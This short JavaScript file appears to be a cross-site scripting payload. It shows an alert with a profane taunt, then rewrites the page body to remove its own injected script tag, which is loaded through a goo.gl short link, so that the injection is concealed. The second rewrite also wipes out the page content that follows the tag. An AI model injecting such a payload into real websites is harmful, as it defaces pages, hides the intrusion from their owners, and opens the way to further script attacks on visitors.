alert("XSS BITCH!");

//var script = document.querySelector("script[src='//goo.gl/GFfRmX']")

var script = document.currentScript;

var oldHtml = document.body.innerHTML;

var newHtml = oldHtml.slice(0, oldHtml.indexOf("<script src=\"//goo.gl/PHPvuT\">"));//the first argument of slice is the start position (index 0), but the second is how MANY characters

document.body.innerHTML = newHtml + oldHtml.slice( newHtml.length + "<script src=\"//goo.gl/PHPvuT\">".length )

document.body.innerHTML = newHtml;
